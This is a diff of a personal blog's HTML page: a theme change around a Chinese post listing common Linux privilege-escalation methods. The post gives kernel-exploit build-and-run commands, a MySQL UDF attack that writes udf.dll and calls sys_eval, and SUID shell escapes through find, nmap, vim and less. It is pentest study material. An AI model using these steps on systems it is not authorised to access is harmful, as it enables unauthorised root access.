@@ -1,65 +1,108 @@
 <!DOCTYPE html>
-<html lang="en"><head>
-    <title>HUGO.386</title>
-    <meta content="text/html;charset=utf-8" http-equiv="Content-Type">
-    <meta content="utf-8" http-equiv="encoding">
+<html lang="en">
+
+  <head>
+    <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="format-detection" content="telephone=no" />
-    <meta name="theme-color" content="#000084" />
-    <link rel="icon" href="https://fumerem.github.io/favicon.ico">
-    <link rel="canonical" href="https://fumerem.github.io">
-    
-    
-</head>
-<body>
-<nav class="navbar navbar-inverse navbar-fixed-top">
-    <div class="navbar-inner">
-        <div class="container">
-            <button type="button" class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse"></button>
-            <a class="brand" href="https://fumerem.github.io">HUGO.386</a>
-            <div class="nav-collapse collapse">
-                <ul class="nav">
-                    
-                    
-                        
-                            <li>
-                                <a href="/about/">
-                                    
-                                    <span>About</span>
-                                </a>
-                            </li>
-                        
-                    
-                        
-                            <li>
-                                <a href="/posts/">
-                                    
-                                    <span>All posts</span>
-                                </a>
-                            </li>
-                        
-                    
-                </ul>
-            </div>
-        </div>
-    </div>
-</nav><div id="content" class="container">
 
-<div class="row-fluid navmargin">
-    <div class="page-header">
-        <h1>列举常见linux提权方式 - Sun, Jun 12, 2022</h1>
-    </div>
+    <meta name="author" content="Fumerem">
+    <meta name="description" content="https://fumerem.github.io">
+    <meta name="keywords" content="blog,developer,personal">
+
+    <meta property="og:site_name" content="rem &#39;s blog">
+    <meta property="og:title" content="
+  列举常见linux提权方式 - rem &#39;s blog
+">
+    <meta property="og:description" content="">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://fumerem.github.io/posts/hack/%E5%88%97%E4%B8%BE%E5%B8%B8%E8%A7%81linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/">
+    <meta property="og:image" content="https://fumerem.github.io">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="https://fumerem.github.io/posts/hack/%E5%88%97%E4%B8%BE%E5%B8%B8%E8%A7%81linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/">
+    <meta name="twitter:image" content="https://fumerem.github.io">
+
+    <base href="https://fumerem.github.io/posts/hack/%E5%88%97%E4%B8%BE%E5%B8%B8%E8%A7%81linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/">
+    <title>
+  列举常见linux提权方式 - rem &#39;s blog
+</title>
+
+    <link rel="canonical" href="https://fumerem.github.io/posts/hack/%E5%88%97%E4%B8%BE%E5%B8%B8%E8%A7%81linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/">
     
-    <h1 id="0x00信息收集">0x00信息收集</h1>
-<pre tabindex="0"><code>lsb_release -a
-查看系统发行版本
+    <link  rel="stylesheet" href="https://fonts.googleapis.com/css?family=Fira+Mono:400,700">
+    <link rel="stylesheet" href="/css/normalize.min.css">
+    <link rel="stylesheet" href="/css/style.min.css">
 
-uname -a
-查看内核版本
+    
 
-whoami
-检测当前用户权限
-</code></pre><h1 id="0x01-内核提权">0x01 内核提权</h1>
+    
+
+    <link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+    
+      <link rel="alternate" href="https://fumerem.github.io/index.xml" type="application/rss+xml" title="rem &#39;s blog">
+      <link href="https://fumerem.github.io/index.xml" rel="feed" type="application/rss+xml" title="rem &#39;s blog" />
+    
+
+    <meta name="generator" content="Hugo 0.100.2" />
+  </head>
+
+  <body class="">
+    <main class="wrapper">
+      <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="/">rem &#39;s blog</a>
+    <input type="checkbox" id="menu-control"/>
+    <label class="menu-mobile  float-right " for="menu-control">
+      <span class="btn-mobile  float-right ">&#9776;</span>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item  align-center ">
+              <a class="navigation-link" href="https://fumerem.github.io/about">About</a>
+            </li>
+          
+            <li class="navigation-item  align-center ">
+              <a class="navigation-link" href="https://fumerem.github.io/posts">Posts</a>
+            </li>
+          
+            <li class="navigation-item  align-center ">
+              <a class="navigation-link" href="https://github.com/fumerem">Project</a>
+            </li>
+          
+            <li class="navigation-item  align-center ">
+              <a class="navigation-link" href="https://fumerem.github.io/index.xml">Rss</a>
+            </li>
+          
+        
+        
+      </ul>
+    </label>
+  </section>
+</nav>
+
+
+      <div class="content">
+        
+  <section class="container post">
+  <article>
+    <header>
+      <h1 class="title">列举常见linux提权方式</h1>
+      <h2 class="date">May 25, 2022</h2>
+
+      
+    </header>
+
+    <h1 id="0x00-信息收集">0x00 信息收集</h1>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">lsb_release -a
+</span></span><span class="line"><span class="cl">查看系统发行版本
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">uname -a
+</span></span><span class="line"><span class="cl">查看内核版本
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">whoami
+</span></span><span class="line"><span class="cl">检测当前用户权限
+</span></span></code></pre></div><h1 id="0x01-内核提权">0x01 内核提权</h1>
 <h2 id="cve-2021-4034">CVE-2021-4034</h2>
 <p>pkexec 本地提权</p>
 <p><a href="https://github.com/berdav/CVE-2021-4034">https://github.com/berdav/CVE-2021-4034</a></p>
@@ -68,24 +111,24 @@ whoami
 <h2 id="脏牛提权-cve-2016-5195">脏牛提权-CVE-2016-5195</h2>
 <p>条件: linux内核=&gt;2.6.22</p>
 <p><a href="https://github.com/FireFart/dirtycow">https://github.com/FireFart/dirtycow</a></p>
-<pre tabindex="0"><code>gcc -pthread dirty.c -o dirty -lcrypt
-./dirty
-mv /tmp/passwd.bak /etc/passwd
-</code></pre><h2 id="cve-2017-16995">CVE-2017-16995</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gcc -pthread dirty.c -o dirty -lcrypt
+</span></span><span class="line"><span class="cl">./dirty
+</span></span><span class="line"><span class="cl">mv /tmp/passwd.bak /etc/passwd
+</span></span></code></pre></div><h2 id="cve-2017-16995">CVE-2017-16995</h2>
 <p>影响版本: Linux Kernel Version 4.14-4.4 仅影响Ubuntu/Debian发行版本</p>
 <p><a href="https://github.com/Al1ex/CVE-2017-16995">https://github.com/Al1ex/CVE-2017-16995</a></p>
-<pre tabindex="0"><code>gcc exploit.c -o exploit
-./exploit
-</code></pre><h2 id="linenumsh本地linux枚举和提权辅助脚本">LINENUM.SH（本地LINUX枚举和提权辅助脚本）</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gcc exploit.c -o exploit
+</span></span><span class="line"><span class="cl">./exploit
+</span></span></code></pre></div><h2 id="linenumsh本地linux枚举和提权辅助脚本">LINENUM.SH（本地LINUX枚举和提权辅助脚本）</h2>
 <p>帮助提取linux系统信息</p>
 <p><a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></p>
-<pre tabindex="0"><code>chmod +x /tmp/LinEnum.sh
-sh /tmp/LinEnum.sh &amp;gt; /tmp/getinfo.txt
-</code></pre><h2 id="linux-exploit-suggester2">linux-exploit-suggester2</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">chmod +x /tmp/LinEnum.sh
+</span></span><span class="line"><span class="cl">sh /tmp/LinEnum.sh <span class="p">&amp;</span>gt<span class="p">;</span> /tmp/getinfo.txt
+</span></span></code></pre></div><h2 id="linux-exploit-suggester2">linux-exploit-suggester2</h2>
 <p><a href="https://github.com/jondonas/linux-exploit-suggester-2">https://github.com/jondonas/linux-exploit-suggester-2</a></p>
 <p>帮助查看系统存在的提取漏洞</p>
-<pre tabindex="0"><code>perl linux-exploit-suggester-2.pl
-</code></pre><h2 id="kali-searchexploit">kali searchexploit</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">perl linux-exploit-suggester-2.pl
+</span></span></code></pre></div><h2 id="kali-searchexploit">kali searchexploit</h2>
 <p>​	searchsploit是一个用于Exploit-DB的命令行搜索工具，可以帮助我们查找渗透模块。</p>
 <p><strong>语法</strong></p>
 <blockquote>
@@ -117,20 +160,20 @@ sh /tmp/LinEnum.sh &amp;gt; /tmp/getinfo.txt
 <p>mysql有写入文件的权限</p>
 </blockquote>
 <h2 id="1查看mysql有写入文件的权限">1.查看mysql有写入文件的权限</h2>
-<pre tabindex="0"><code>show global variables like &#39;%secure%&#39;;
-</code></pre><blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">show</span><span class="w"> </span><span class="k">global</span><span class="w"> </span><span class="n">variables</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;%secure%&#39;</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></div><blockquote>
 <p>secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出
 当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下
 当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制</p>
 </blockquote>
 <p>若secure_file_priv不为空白,可以在mysql/my.ini中修改</p>
-<pre tabindex="0"><code> secure_file_priv = &#39; &#39;
-</code></pre><p>然后重启apache服务</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="w"> </span><span class="n">secure_file_priv</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39; &#39;</span><span class="w">
+</span></span></span></code></pre></div><p>然后重启apache服务</p>
 <p>查看plugin位置</p>
-<pre tabindex="0"><code>show variables like &#39;plugin%&#39;;
-</code></pre><p>查看数据库和服务器架构信息</p>
-<pre tabindex="0"><code>select @@version_compile_os, @@version_compile_machine;
-</code></pre><h2 id="2上传写入动态链接库">2.上传&amp;写入动态链接库</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">show</span><span class="w"> </span><span class="n">variables</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;plugin%&#39;</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></div><p>查看数据库和服务器架构信息</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="o">@@</span><span class="n">version_compile_os</span><span class="p">,</span><span class="w"> </span><span class="o">@@</span><span class="n">version_compile_machine</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></div><h2 id="2上传写入动态链接库">2.上传&amp;写入动态链接库</h2>
 <blockquote>
 <p>1.Mysql版本大于5.1，plugin文件夹默认不存在，需要自行创建lib/plugin</p>
 <p>#若失败，更改my.ini，添加plugin_dir=C:/或者C:/System32</p>
@@ -141,126 +184,113 @@ sh /tmp/LinEnum.sh &amp;gt; /tmp/getinfo.txt
 <h3 id="上传">上传</h3>
 <p>利用sqlmap或者大马直接传输udf.dll,没什么好说的</p>
 <h3 id="写文件">写文件</h3>
-<pre tabindex="0"><code>create table temp(data longblob);
-select 0x0....(16进制字节) INTO DUMPFILE &#39;C:\\udf.dll&#39;;
-</code></pre><p>国光师傅已经归纳好了 <a href="https://www.sqlsec.com/tools/udf.html">https://www.sqlsec.com/tools/udf.html</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">create</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">temp</span><span class="p">(</span><span class="k">data</span><span class="w"> </span><span class="n">longblob</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="mi">0</span><span class="n">x0</span><span class="p">....(</span><span class="mi">16</span><span class="err">进制字节</span><span class="p">)</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">DUMPFILE</span><span class="w"> </span><span class="s1">&#39;C:\\udf.dll&#39;</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></div><p>国光师傅已经归纳好了 <a href="https://www.sqlsec.com/tools/udf.html">https://www.sqlsec.com/tools/udf.html</a></p>
 <h2 id="3创建自定义函数">3.创建自定义函数</h2>
-<pre tabindex="0"><code>create table temp(data longblob);
-select 0x0.... INTO DUMPFILE &#39;C:\\udf.dll&#39;;
-create function sys_eval returns string soname &#39;udf.dll&#39;;   #创建函数sys_eval
-select * from mysql.func where name = &#39;sys_eval&#39;;    #查看创建的sys_eval函数
-select sys_eval(&#39;whoami&#39;);       
-</code></pre><h1 id="0x03-suid提权">0x03 SUID提权</h1>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">create</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">temp</span><span class="p">(</span><span class="k">data</span><span class="w"> </span><span class="n">longblob</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="mi">0</span><span class="n">x0</span><span class="p">....</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">DUMPFILE</span><span class="w"> </span><span class="s1">&#39;C:\\udf.dll&#39;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">create</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="n">sys_eval</span><span class="w"> </span><span class="k">returns</span><span class="w"> </span><span class="n">string</span><span class="w"> </span><span class="n">soname</span><span class="w"> </span><span class="s1">&#39;udf.dll&#39;</span><span class="p">;</span><span class="w">   </span><span class="o">#</span><span class="err">创建函数</span><span class="n">sys_eval</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">mysql</span><span class="p">.</span><span class="n">func</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;sys_eval&#39;</span><span class="p">;</span><span class="w">    </span><span class="o">#</span><span class="err">查看创建的</span><span class="n">sys_eval函数</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="n">sys_eval</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">);</span><span class="w">       
+</span></span></span></code></pre></div><h1 id="0x03-suid提权">0x03 SUID提权</h1>
 <h2 id="1什么是suid">1.什么是SUID</h2>
 <p>SUID(SET UID)是linux的一种特殊权限,当权限为suid的程序作为进程运行时,它的属主不是进程发起者,而是程序文件的所有者.(只针对二进制可执行文件)</p>
 <p>比如在非root权限的条件下运行find程序,而find程序的所有者是root,我们就能短暂地执行root的命令,该进程的权限即为root.</p>
-<pre tabindex="0"><code>设置SUID
-chmod u+s filename   设置SUID位
-chmod u-s filename   去掉SUID设置
-
-ls -al               查看文件权限
-</code></pre><h2 id="2利用suid提权">2.利用SUID提权</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">设置SUID
+</span></span><span class="line"><span class="cl">chmod u+s filename   设置SUID位
+</span></span><span class="line"><span class="cl">chmod u-s filename   去掉SUID设置
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">ls -al               查看文件权限
+</span></span></code></pre></div><h2 id="2利用suid提权">2.利用SUID提权</h2>
 <p>常见的拥有SUID的程序有</p>
 <blockquote>
-<pre tabindex="0"><code>nmap
-vim
-find
-bash
-more
-less
-nano
-cp
-awk
-</code></pre></blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nmap
+</span></span><span class="line"><span class="cl">vim
+</span></span><span class="line"><span class="cl">find
+</span></span><span class="line"><span class="cl">bash
+</span></span><span class="line"><span class="cl">more
+</span></span><span class="line"><span class="cl">less
+</span></span><span class="line"><span class="cl">nano
+</span></span><span class="line"><span class="cl">cp
+</span></span><span class="line"><span class="cl">awk
+</span></span></code></pre></div></blockquote>
 <p>查看拥有SUID权限的文件,皆可.</p>
-<pre tabindex="0"><code>find / -user root -perm -4000 -print 2&gt;/dev/null
-find / -perm -u=s -type f 2&gt;/dev/null
-find / -user root -perm -4000 -exec ls -ldb {};
-</code></pre><p>查看文件权限</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">find / -user root -perm -4000 -print 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">find / -perm -u<span class="o">=</span>s -type f 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">find / -user root -perm -4000 -exec ls -ldb <span class="o">{}</span><span class="p">;</span>
+</span></span></code></pre></div><p>查看文件权限</p>
 <p><img src="https://s2.loli.net/2022/05/03/WlE8fKQnMkUw2FO.png" alt=""></p>
 <p>可见,权限为suid且所有者为root</p>
 <h3 id="nmap202502">nmap(2.02~5.02)</h3>
 <p>早期nmap带有交互模式,运行执行shell命令</p>
-<pre tabindex="0"><code>nmap --interactive
-nmap&gt; !sh
-sh-3.2# whoami
-root
-</code></pre><h3 id="find">find</h3>
-<pre tabindex="0"><code>touch demo
-find demo -exec whoami \;
-find demo -exec &#39;/bin/sh&#39; \;
-</code></pre><h3 id="vim">vim</h3>
-<pre tabindex="0"><code>vim/vi
-:shell
-</code></pre><h3 id="lessmore">less/more</h3>
-<pre tabindex="0"><code>less /etc/passwd
-!/bin/sh
-</code></pre><h3 id="bash">bash</h3>
-<pre tabindex="0"><code>less /etc/passwd
-!/bin/sh
-</code></pre><h3 id="nano">nano</h3>
-<pre tabindex="0"><code>nano #进入nano编辑器
-Ctrl + R
-Ctrl + X
-即可输入命令
-</code></pre>
-    <h4><a href="https://fumerem.github.io">Back to Home</a></h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap --interactive
+</span></span><span class="line"><span class="cl">nmap&gt; !sh
+</span></span><span class="line"><span class="cl">sh-3.2# whoami
+</span></span><span class="line"><span class="cl">root
+</span></span></code></pre></div><h3 id="find">find</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">touch demo
+</span></span><span class="line"><span class="cl">find demo -exec whoami <span class="se">\;</span>
+</span></span><span class="line"><span class="cl">find demo -exec <span class="s1">&#39;/bin/sh&#39;</span> <span class="se">\;</span>
+</span></span></code></pre></div><h3 id="vim">vim</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">vim/vi
+</span></span><span class="line"><span class="cl">:shell
+</span></span></code></pre></div><h3 id="lessmore">less/more</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">less /etc/passwd
+</span></span><span class="line"><span class="cl">!/bin/sh
+</span></span></code></pre></div><h3 id="bash">bash</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">less /etc/passwd
+</span></span><span class="line"><span class="cl">!/bin/sh
+</span></span></code></pre></div><h3 id="nano">nano</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nano <span class="c1">#进入nano编辑器</span>
+</span></span><span class="line"><span class="cl">Ctrl + R
+</span></span><span class="line"><span class="cl">Ctrl + X
+</span></span><span class="line"><span class="cl">即可输入命令
+</span></span></code></pre></div>
+  </article>
+
+  <br/>
+
+  
+  
+</section>
+
+      </div>
+      
+        <footer class="footer">
+  <section class="container">
+    
+    
+     © 2022    ·  Powered by <a href="https://gohugo.io/">Hugo</a> & <a href="https://github.com/naro143/hugo-coder-portfolio">CoderPortfolio</a>. 
+
+  </section>
+</footer>
+<div class="fixed-bar">
+  <section class="container">
+    
+      <p id="privateTriggerText">Do you want to find something usable?<a id="privateTrigger">Click!</a></p>
+    
+    
+  </section>
 </div>
 
-
-        </div><footer class="container">
-    <hr class="soften">
-    <p>
-
-    <a href="https://gitlab.com/maxlefou/hugo.386">hugo.386 theme by Max le Fou</a> | 
-
-&copy; 
-<a href="http://jmf-portfolio.netlify.com" target="_blank">
-    Fumerem
-</a>
-<span id="thisyear">2020</span>
-
-
-        | <a href="//gohugo.io" target="_blank">Hugo</a>Built on
-
-</p>
-    <p class="text-center">
-        
-        
-        
-        <a href="https://github.com">GitHub</a> 
-        
-    </p>
-</footer>
-
-</body><link rel="stylesheet" href="/css/bootstrap.css">
-<link rel="stylesheet" href="/css/bootstrap-responsive.css">
-<link rel="stylesheet" href="/css/style.css">
-
-<script src="/js/jquery.js"></script>
-<script src="/js/bootstrap-386.js"></script>
-<script src="/js/bootstrap-transition.js"></script>
-<script src="/js/bootstrap-alert.js"></script>
-<script src="/js/bootstrap-modal.js"></script>
-<script src="/js/bootstrap-dropdown.js"></script>
-<script src="/js/bootstrap-scrollspy.js"></script>
-<script src="/js/bootstrap-tab.js"></script>
-<script src="/js/bootstrap-tooltip.js"></script>
-<script src="/js/bootstrap-popover.js"></script>
-<script src="/js/bootstrap-button.js"></script>
-<script src="/js/bootstrap-collapse.js"></script>
-<script src="/js/bootstrap-carousel.js"></script>
-<script src="/js/bootstrap-typeahead.js"></script>
-<script src="/js/bootstrap-affix.js"></script>
-<script>
-    _386 = { 
-        fastLoad: false ,
-        onePass: false , 
-        speedFactor: 1 
-    };
+      
+    </main>
 
     
-    function ThisYear() {
-        document.getElementById('thisyear').innerHTML = new Date().getFullYear();
-    };
-</script></html>
+
+  <script src="/js/app.js"></script>
+  
+  <script>
+  (function($) {
+    $(function() {
+      $('#privateTrigger').on('click', function() {
+        $('.private').slideToggle();
+        $('#privateTriggerText').text("No, I have no value for you to seek.");
+      });
+    });
+   })(jQuery);
+  </script>
+  
+  </body>
+</html>
